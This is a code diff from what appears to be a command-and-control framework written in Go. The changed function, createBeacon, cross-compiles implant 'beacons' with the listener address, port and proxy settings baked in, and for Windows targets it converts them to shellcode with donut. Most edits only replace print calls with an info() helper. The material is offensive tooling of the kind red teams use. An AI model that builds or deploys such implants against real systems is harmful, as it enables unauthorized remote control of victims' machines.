@@ -19,31 +19,31 @@ var platforms = map[string][]string {
 func createBeacon(listener int) {
 	reader := bufio.NewReader(os.Stdin)
 
+	info("Pick target")
 	listTargets()
-	fmt.Print("Target: ")
-	input, err := reader.ReadString('\n')
-	num, err := strconv.Atoi(input[:len(input)-1])
+	input := readLine()
+	num, err := strconv.Atoi(input)
 
 	if err != nil || num < 0 || num > len(targets) {
-		fmt.Println("Invalid choice.")
+		info("Invalid choice. " + err.Error())
 		return
 	}
 
 	target := targets[num]
 
+	info("Pick platform")
 	listPlatforms(target)
-	fmt.Print("Platform: ")
-	input, err = reader.ReadString('\n')
-	num2, err := strconv.Atoi(input[:len(input)-1])
+	input = readLine()
+	num2, err := strconv.Atoi(input)
 
 	if err != nil || num2 < 0 || num2 > len(platforms[target]) {
-		fmt.Println("Invalid choice.")
+		info("Invalid choice.")
 		return
 	}
 
 	platform := getPlatform(num, num2)
 
-	fmt.Println("Using " + target + "/" + platform)
+	info("Using " + target + "/" + platform)
 
 	//fmt.Print("Proxy? (y/n): ")
 	input = "n"//, err = reader.ReadString('\n')
@@ -66,7 +66,7 @@ func createBeacon(listener int) {
 
 	if input == "y\n" {
 		if len(beacons) == 0 {
-			fmt.Println("No beacons to proxy to.")
+			info("No beacons to proxy to.")
 			return
 		}
 		listBeacons()
@@ -75,23 +75,23 @@ func createBeacon(listener int) {
 		input = strings.ReplaceAll(input, "\n", "")
 
 		if err != nil {
-			fmt.Println("Invalid input.")
+			info("Invalid input.")
 			return
 		}
 		
 		beacon := getBeaconByIdOrIndex(input)
 
 		if beacon == nil {
-			fmt.Println(input + " is not a beacon.")
+			info(input + " is not a beacon.")
 			return
 		}
 
 		notifyBeaconOfProxyUpdate(beacon, beaconId)
 
-		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
+		info("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
 		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go")
 	} else {
-		fmt.Println("No proxy")
+		info("No proxy")
 		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
 	}
 
@@ -125,29 +125,49 @@ func createBeacon(listener int) {
 	}
 
 	if len(output) > 0 {
-		fmt.Println(output)
+		info(output)
 	}
 
 	//beacon := &Beacon{"n/a", beaconId, nil, nil, nil, nil, time.Time{}}
 	// beacons = append(beacons, beacon)
-	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
+	info("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
 	
 	if target == "windows" {
-		out, _ := exec.Command("/bin/sh", "-c", "./includes/donut out/" + beaconName + " -o out/" + beaconName + ".bin").Output()
-		fmt.Println(string(out))
+		output = ""
+		cmdHandle := exec.Command("/bin/sh", "-c", "./includes/donut out/" + beaconName + " -o out/" + beaconName + ".bin")
+		stdout, err := cmdHandle.StdoutPipe()
+		stderr, err := cmdHandle.StderrPipe()
+
+		if err = cmdHandle.Start(); err == nil {
+			scanner := bufio.NewScanner(stdout)
+			for scanner.Scan() {
+				output += scanner.Text()
+				output += "\n"
+			}
+			
+			scanner = bufio.NewScanner(stderr)
+			for scanner.Scan() {
+				output += scanner.Text()
+				output += "\n"
+			}
+		}
+
+		if len(output) > 0 {
+			info(output)
+		}
 	}
 }
 
 func listTargets() {
 	for i, n := range targets {
-		fmt.Println("[" + strconv.Itoa(i) + "]", n)
+		info("[" + strconv.Itoa(i) + "] " + n)
 	}
 }
 
 func listPlatforms(target string) {
 	i := 0
 	for _, n := range platforms[target] {
-		fmt.Println("[" + strconv.Itoa(i) + "]", n)
+		info("[" + strconv.Itoa(i) + "] " + n)
 		i++
 	}
 }
